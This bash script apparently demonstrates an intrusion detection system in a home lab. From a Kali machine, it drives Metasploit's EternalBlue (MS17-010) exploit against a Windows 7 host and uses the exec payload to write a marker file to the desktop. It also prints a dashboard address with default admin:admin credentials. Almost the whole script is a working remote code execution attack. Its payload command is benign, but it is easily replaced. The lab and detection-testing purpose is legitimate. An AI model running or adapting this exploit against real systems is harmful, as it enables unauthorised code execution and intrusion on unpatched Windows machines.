#!/bin/bash
# EternalBlue (MS17-010) file drop on Windows 7 target
# Writes GUARDNET_PWNED.txt to C:\Users\Public\Desktop\
# No reverse shell needed — uses windows/exec payload (cmd only)
# Run from Kali: sudo bash ~/eternalblue_drop.sh

CONF="/home/kali/guardnet.conf"
[ -f "$CONF" ] && eval "$(grep -v '^\s*#' "$CONF" | grep '=' | sed 's/\s*#.*//')"

TARGET="${TARGET:-192.168.4.7}"
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
FILE_CONTENT="GUARDNET IDS DEMO - ESP32-S3 TinyML\nPwned via EternalBlue (MS17-010)\nTime: $TIMESTAMP\nAttacker: Kali Linux VM\nTarget: $TARGET\nDetected by: GuardNet IDS"
DEST_FILE='C:\\Users\\Public\\Desktop\\GUARDNET_PWNED.txt'
CMD="cmd.exe /c echo ${FILE_CONTENT//$'\n'/' && echo '} > $DEST_FILE"

echo "[*] Target: $TARGET"
echo "[*] Dropping file to: $DEST_FILE"
echo ""

msfconsole -q -x "
    use exploit/windows/smb/ms17_010_eternalblue;
    set RHOSTS $TARGET;
    set PAYLOAD windows/x64/exec;
    set CMD cmd.exe /c \"echo GuardNet IDS DEMO - Pwned via EternalBlue MS17-010 > C:\\\\Users\\\\Public\\\\Desktop\\\\GUARDNET_PWNED.txt && echo Attacker: Kali VM >> C:\\\\Users\\\\Public\\\\Desktop\\\\GUARDNET_PWNED.txt && echo Time: $TIMESTAMP >> C:\\\\Users\\\\Public\\\\Desktop\\\\GUARDNET_PWNED.txt\";
    set ExitOnSession true;
    exploit;
    exit -y
" 2>&1 | grep -E 'session|exploit|Sending|FAILED|CMD|Success|shell|panic|target' | head -20

echo ""
echo "[*] Check Win7 Desktop for GUARDNET_PWNED.txt"
echo "[*] IDS dashboard: http://192.168.4.1/ (admin:admin)"
